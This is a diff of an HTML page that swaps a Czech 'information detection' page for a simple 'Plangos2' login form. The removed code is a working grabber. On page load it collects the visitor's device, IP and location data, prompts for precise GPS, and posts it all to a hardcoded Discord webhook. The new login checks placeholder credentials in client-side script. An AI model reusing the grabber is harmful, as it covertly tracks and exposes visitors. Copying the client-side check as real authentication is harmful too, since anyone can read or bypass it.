@@ -1,96 +1,82 @@
 <!DOCTYPE html>
-<html lang="cs">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Detekce Informací</title>
-
-    <!-- Přidání Google Maps API pro vyvolání GPS popupu -->
-    <script src="https://maps.googleapis.com/maps/api/js?key=TVUJ_GOOGLE_MAPS_API_KEY"></script>
+    <title>Plangos2 Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        .login-container h2 {
+            text-align: center;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #45a049;
+        }
+        .error-message {
+            color: red;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-    <h2>Načítání informací...</h2>
 
-    <script>
-        const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
+<div class="login-container">
+    <h2>Login</h2>
+    <form id="loginForm">
+        <input type="text" id="username" class="input-field" placeholder="Username" required><br>
+        <input type="password" id="password" class="input-field" placeholder="Password" required><br>
+        <button type="submit" class="login-btn">Login</button>
+    </form>
+    <p class="error-message" id="errorMessage"></p>
+</div>
 
-        function sendToWebhook(data) {
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: data })
-            }).catch(err => console.error("Chyba při odesílání:", err));
+<script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        // Zde přidáš autentifikaci (například s Plangos2)
+        if (username === "yourUsername" && password === "yourPassword") {
+            window.location.href = "dashboard.html"; // Přesměrování po přihlášení
+        } else {
+            document.getElementById("errorMessage").textContent = "Invalid username or password.";
         }
+    });
+</script>
 
-        function getDeviceInfo() {
-            return `📱 Zařízení: ${navigator.userAgent}`;
-        }
-
-        function getIPInfo(callback) {
-            fetch("https://ipapi.co/json/")
-                .then(response => response.json())
-                .then(data => {
-                    let ipMessage = `🌍 IP Adresa: ${data.ip || "Neznámá"} (Město: ${data.city || "Neznámé"}, Země: ${data.country || "Neznámé"})\n🌐 VPN: ${data.proxy ? "Ano" : "Ne"}`;
-                    callback(ipMessage);
-                })
-                .catch(error => {
-                    console.error("Chyba při získávání IP:", error);
-                    callback("🌍 IP Adresa: Neznámá\n🌐 VPN: Neznámé");
-                });
-        }
-
-        function sendInitialData() {
-            getIPInfo(ipData => {
-                let message = `${getDeviceInfo()}\n${ipData}\n📍 GPS: Nepovoleno`;
-                sendToWebhook(message);
-                requestLocationPermission();
-            });
-        }
-
-        function requestLocationPermission() {
-            if (navigator.geolocation) {
-                // Pokud geolokace není povolena, zobrazíme potvrzovací okno
-                if (confirm("Chcete povolit sdílení vaší polohy?")) {
-                    // Pokud uživatel klikne na "Ano", požádáme o polohu
-                    enableGPS();
-                } else {
-                    console.log("Uživatel zamítl povolení polohy.");
-                }
-            } else {
-                console.warn("Geolokace není podporována.");
-            }
-        }
-
-        function enableGPS() {
-            if (navigator.geolocation) {
-                // Po zapnutí GPS vyvoláme geolokaci v prohlížeči
-                setTimeout(askForLocation, 3000);
-            }
-        }
-
-        function askForLocation() {
-            navigator.geolocation.getCurrentPosition(getLocation, error => {
-                console.error("GPS nebyla povolena.", error);
-            }, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
-        }
-
-        function getLocation(position) {
-            let { latitude, longitude } = position.coords;
-            let mapLink = `https://en.mapy.cz/zakladni?q=${latitude}%2C%20${longitude}&x=${longitude}&y=${latitude}&z=15`;
-            let gpsMessage = `📍 GPS Souřadnice: ${latitude}, ${longitude}\n🔗 Mapa: [Zobrazit na Mapy.cz](${mapLink})`;
-
-            getIPInfo(ipData => {
-                let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
-                sendToWebhook(message);
-            });
-        }
-
-        // ✅ Automaticky požádá o polohu ihned po načtení
-        sendInitialData();
-    </script>
 </body>
 </html>
